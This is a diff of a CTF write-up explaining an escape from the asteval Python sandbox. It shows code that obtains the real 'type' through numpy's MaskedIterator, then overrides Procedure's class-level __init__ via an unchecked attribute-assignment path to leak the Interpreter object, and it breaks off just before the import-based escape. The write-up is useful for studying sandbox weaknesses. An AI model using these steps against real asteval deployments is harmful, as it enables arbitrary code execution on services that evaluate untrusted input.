@@ -60,9 +60,7 @@ Specifically these filters are to block:
 `byte` and `bytearray`, `dtype`, `type` (the numpy attribute), `ctypes`, `format`, `buffer` and dict unwrapping as a way to pass keyword arguments to functions in a way to bypass text filters (since the dictionary keys are string literals that can be constructed past the filter).
 
 ## The solution:
-During the CTF there were two solves, by two familiar faces when it comes to pyjails, Lyndon from MMM and oh_word from Infobahn.
-
-Lyndon's solve is based on f-strings and the well-known method of using `AttributeError.obj` to extract a value from a format string, which was a variant of a solve for the UofTCTF chals. It's a technique that I'm aware of. `asteval` had a patch after UofTCTF which intended to fix this but didn't work. Because of a version difference this didn't work during my testing, so I didn't filter it.
+During the CTF there were two solves, by two familiar faces when it comes to pyjails, from MMM and oh_word from Infobahn.
 
 oh_word's solve went the intended route to obtain `type` and then did memory exploitation, presumably via the bytes class object.
 
@@ -102,6 +100,11 @@ Note that `self.dataiter` and `self.ma` are user-controlled. Thus, if we can mak
 
 At this point we need to figure out how to get a `MaskedIterator` instance from `genfromtxt`.
 
+In the `numpy` code there is only one place where a `MaskedIterator` instance is created, in `MaskedArray.flat`.
+
+If we look at the function definition of `genfromtxt`, we see the `usemask` argument. Alternatively we can search for useages of `MaskedArray` and end up at this argument.
+
+Putting this into practice:
 ```python
 # Get `type` primitive
 def id(x):
@@ -114,24 +117,129 @@ mf.maskiter = None
 mf.ma = "foo"
 mf.dataiter = [genfromtxt]
 str = mf[0]
+# Now str is the type `str`
 
 mf.ma = str
 t = mf[0]
+# Now t is the type `type`
 ```
 
-Wat geeft type ons? In de sandbox heb je een fake versie van type. Type stelt ons in staat om class objects te verkrijgen van alle objecten waar we toegang toe hebben in de sandbox, inclusief `asteval`-eigen klassen.
+Having a type primitive, some of the logical next steps to look are instances of `asteval` classes that are available from within the sandbox, such as `Procedure`. User-defined functions within the sandbox are turned into `Procedure` objects in `asteval`.
+
+In `asteval`, the sandbox is interpreted by having the source code parsed into an ast using `ast.parse` and then having evaluating this ast using a node visitor pattern, with functions for nodes to implement the effects that executing that node should have, with an attempt at filters on what effects to allow.
 
 ### Overriding class level dunders to leak the interpreter object:
 
-Point out de bug in setattr van dunders.
-Point out de bug van setattr in Procedure als instance-level-functie ipv class-level.
+One of the main restrictions in `asteval` is the one preventing us from getting arbitrary attributes. In traditional pyjails it is common to traverse attributes of objects to eventually end up at powerful objects, which is why `asteval` forbids some of these.
+Let's see how attributes are parsed via `ast`:
+```python
+>>> print(ast.dump(ast.parse("a.a"), indent=" "))
+Module(
+   body=[
+      Expr(
+         value=Attribute(
+            value=Name(id='a', ctx=Load()),
+            attr='a',
+            ctx=Load()))],
+   type_ignores=[])
+>>> print(ast.dump(ast.parse("a.a = 0"), indent="   "))
+Module(
+   body=[
+      Assign(
+         targets=[
+            Attribute(
+               value=Name(id='a', ctx=Load()),
+               attr='a',
+               ctx=Store())],
+         value=Constant(value=0))],
+   type_ignores=[])
+```
+Now let's look at the source code of the attribute node handler in `asteval`:
+```python
+def on_attribute(self, node):    # ('value', 'attr', 'ctx')
+    """Extract attribute."""
+
+    ctx = node.ctx.__class__
+    if ctx == ast.Store:
+        msg = "attribute for storage: shouldn't be here!"
+        self.raise_exception(node, exc=RuntimeError, msg=msg)
+
+    sym = self.run(node.value)
+    if ctx == ast.Del:
+        return delattr(sym, node.attr)
+    return safe_getattr(sym, node.attr, self.raise_exception, node,
+                        allow_unsafe_modules=self.allow_unsafe_modules)
+```
+
+It doesn't seem like we can assign to attributes here and getting attributes goes via `safe_getattr` which has filters on the attribute names.
+However, remember that `asteval` evaluates code by recursing through the abstract syntax tree in a node visitor-like pattern.
+For an attribute assignment, we end up in `on_assign` before ever ending up in `on_attribute`:
+```python
+def on_assign(self, node):    # ('targets', 'value')
+    """Simple assignment."""
+    val = self.run(node.value)
+    for tnode in node.targets:
+        self.node_assign(tnode, val)
+```
+```python
+def node_assign(self, node, val):
+    ...
+    elif node.__class__ == ast.Attribute:
+        if node.ctx.__class__ == ast.Load:
+            msg = f"cannot assign to attribute {node.attr}"
+            self.raise_exception(node, exc=AttributeError, msg=msg)
+
+        setattr(self.run(node.value), node.attr, val)
+```
+i.e. in an assignment to an attribute, we will never end up in `on_attribute` and `setattr` is run unconditionally! This means that there are no actual restrictions on attribute assignment.
+
+Let's look at the source code for `Procedure`:
+```python
+class Procedure:
+    def __init__(self, name, interp, doc=None, lineno=None,
+                 body=None, text=None, args=None, kwargs=None,
+                 vararg=None, varkws=None):
+        self.__ininit__ = True
+        self.name = name
+        self.__name__ = self.name
+        self.__asteval__ = interp
+        self.__raise_exc__ = self.__asteval__.raise_exception
+        self.__doc__ = doc
+        self.__body__ = body
+        self.__argnames__ = args
+        self.__kwargs__ = kwargs
+        self.__vararg__ = vararg
+        self.__varkws__ = varkws
+        self.lineno = lineno
+        self.__text__ = text
+        if text is None:
+            self.__text__ = f'{self.__signature__()}\n' + ast.unparse(self.__body__)
+        self.__ininit__ = False
+
+    def __setattr__(self, attr, val):
+        if not getattr(self, '__ininit__', True):
+            self.__raise_exc__(None, exc=TypeError,
+                               msg="procedure is read-only")
+        self.__dict__[attr] = val
+```
+As you can see, there is a mechanism here via the `__ininit__` variable which prevents us from assigning to attributes of `Procedure` instances after they have gone through `__init__`. (as an interesting aside not further relevant for this challenge, notice the default value in `getattr(self, '__ininit__', True)`)
+
+This mechanism prevents us from setting attributes on instances of `Procedure`, but you may know that class attributes for classes that are defined using python source code are also writeable.
+The `__setattr__` defined for `Procedure` is an instance-level function, not a class-level function, which means that there are **no restrictions** on setting attributes on the class object of `Procedure` as opposed to its instances.
 
 ```python
 # Get Procedure class object
 def f():
     pass
 p = t(f)
+```
 
+In the `__init__` of `Procedure`, the argument `interp` is a reference to the `asteval` `Interpreter` object. It's used for evaluating function calls, such that the `Interpreter` evaluation control flow can go via `__call__`. I expect that this was done such that user defined functions within the sandbox can be called in the same way as regular python functions that are exposed as names within the sandbox.
+
+This design choice allows us to leak the `Interpreter` object.
+
+We can override the class level `__init__` of `Procedure` in a way where we exfiltrate the `interp` argument:
+```python
 # Obtain the Interpreter instance
 def stealer(name, interp, doc=None, lineno=None,
                  body=None, text=None, args=None, kwargs=None,
@@ -146,12 +254,12 @@ i = rescuelist[0]
 print(i)
 ```
 
-Dit geeft ons een interpreter-object.
+We now have a reference to the `Interpreter`.
 
 ### Profit:
-Op dit punt zijn er een heleboel opties.
-De makkelijkste is om gewoon gebruik te maken van de importfunctionaliteit.
-Een leuke alternatieve optie is om de attribuutnaam-check in on_name te omzeilen door een fake-subtype van string te maken en daarmee de waarde van een ast.Name node te overschrijven, maar die laat is als exercise to the reader.
+At this point there are a variety of options. It's a very strong object that hasn't been written with security in mind.
+The easiest option is to use the import functionality.
+A fun alternative option is to evade the filters on attribute names in `safe_getattr` by creating a fake subtype of string and overwriting the `id` attribute of an `ast.Name` node with it, but I'll leave that as a fun exercise for the reader.
 
 ```python
 # Import and escape the jail
